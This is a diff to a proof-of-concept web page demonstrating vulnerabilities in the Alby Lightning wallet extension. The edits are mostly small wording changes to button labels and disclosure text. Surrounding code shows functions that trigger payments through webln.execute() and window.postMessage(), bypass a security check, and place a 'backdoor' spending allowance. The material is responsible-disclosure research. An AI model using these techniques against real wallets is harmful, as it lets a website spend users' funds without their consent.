@@ -16,6 +16,7 @@
       }
     </style>
     <script>
+      // The amount is passed in msat here.
       async function getInvoice(amount) {
         const lnurlData = await fetch(`https://getalby.com/lnurlp/aaron/callback?amount=${amount}&comment=Alby%20Vulnerability%20PoC`);
         return (await lnurlData.json()).pr;
@@ -107,9 +108,9 @@
       <h1>🐝 Alby vulnerabilities PoC</h1>
       <p>
         This page demonstrates a few ways to bypass <a href="https://getalby.com">Alby</a>'s security features.
-        The Alby team is informed and these issues will be fixed soon or have already been fixed.
-        Currently, there is no direct confirmation if a payment failed or worked on this page, so be careful not to send
-        me all your sats.
+        The Alby team is informed and most of these issues have been fixed.
+        Currently, there is no direct confirmation if a payment failed or worked on this page, so be careful not to spend all your sats here.
+        This page is written in simple HTML and JavaScript. You can easily verify what it's doing using "Inspect Element".
       </p>
       <section class="container">
         <hgroup>
@@ -118,7 +119,7 @@
           </h4>
         </hgroup>
         <div class="button-group">
-          <button onclick="sendUsingWebLnExec();">Send using webln.execute()</button>
+          <button onclick="sendUsingWebLnExec();">Send 1 sat to me using webln.execute()</button>
           <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code1').classList.toggle('display');return false;">i</a>
           <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:none;padding-left: 1rem;" id="code1">
 async function sendUsingWebLnExec() {
@@ -126,7 +127,7 @@ async function sendUsingWebLnExec() {
     paymentRequest: await getInvoice(1000),
   });
 }</pre>
-          <button onclick="sendUsingPostMsg170();">Send using window.postMessage()</button>
+          <button onclick="sendUsingPostMsg170();">Send 1 sat to me using window.postMessage()</button>
           <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code2').classList.toggle('display');return false;">i</a>
           <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:none;padding-left: 1rem;" id="code2">
 async function sendUsingPostMsg170() {
@@ -150,7 +151,7 @@ async function sendUsingPostMsg170() {
             <h4>These should create a simple payment or "connect" dialog in more recent versions.</h4>
         </hgroup>
         <div class="button-group">
-          <button onclick="sendUsingPostMsg180();">Send using window.postMessage() and bypassing security check</button>
+          <button onclick="sendUsingPostMsg180();">Send 1 sat to me using window.postMessage() and bypassing security check</button>
           <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code3').classList.toggle('display');return false;">i</a>
   <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:none;padding-left: 1rem;" id="code3">
 async function sendUsingPostMsg180() {
@@ -169,7 +170,7 @@ async function sendUsingPostMsg180() {
     "*"
   );
 }</pre>
-          <button onclick="setupBackdoor();">Place a "backdoor" allowance</button>
+          <button onclick="setupBackdoor();">Place a 100 sat "backdoor" allowance</button>
           <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code4').classList.toggle('display');return false;">i</a>
 <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:none;padding-left: 1rem;" id="code4">
 async function setupBackdoor() {
@@ -215,7 +216,7 @@ async function setupBackdoor() {
           <h3>Vulnerabilities in Alby 1.9.0 and below</h3>
           <h4>These are not really dangerous, but still exist</h4>
         </hgroup>
-          <button onclick="bypassEnableSend();">Ask for payment without calling webLn.enable</button>
+          <button onclick="bypassEnableSend();">Ask for a payment without calling webLn.enable</button>
           <a href="#" role="button" class="outline" style="display: inline;" onclick="document.getElementById('code5').classList.toggle('display');return false;">i</a>
 <pre style="width: 100%; margin-bottom: 1rem; padding-top: 1rem; padding-bottom: 1rem;display:none;padding-left: 1rem;" id="code5">
 async function bypassEnableSend() {
@@ -224,7 +225,7 @@ async function bypassEnableSend() {
 }</pre>
     </main>
     <footer class="container">
-      Developed by <a href="https://twitter.com/AaronDewes">@AaronDewes</a>
+      Developed by <a href="https://twitter.com/AaronDewes">@AaronDewes</a>.
     </footer>
   </body>
 </html>
